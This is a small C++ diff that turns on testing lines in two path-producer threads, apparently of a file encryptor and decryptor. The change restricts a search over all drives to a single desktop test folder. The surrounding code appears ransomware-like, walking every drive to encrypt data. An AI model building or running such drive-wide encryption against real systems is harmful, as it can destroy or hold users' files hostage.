@@ -342,8 +342,8 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	//drives = new vector<wstring>();
-	//drives->push_back(L"C:\\test");
+	drives = new vector<wstring>();
+	drives->push_back(L"C:\\Users\\irslambouf\\Desktop\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
@@ -492,8 +492,8 @@ void dec_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	//drives = new vector<wstring>();
-	//drives->push_back(L"C:\\test");
+	drives = new vector<wstring>();
+	drives->push_back(L"C:\\Users\\irslambouf\\Desktop\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
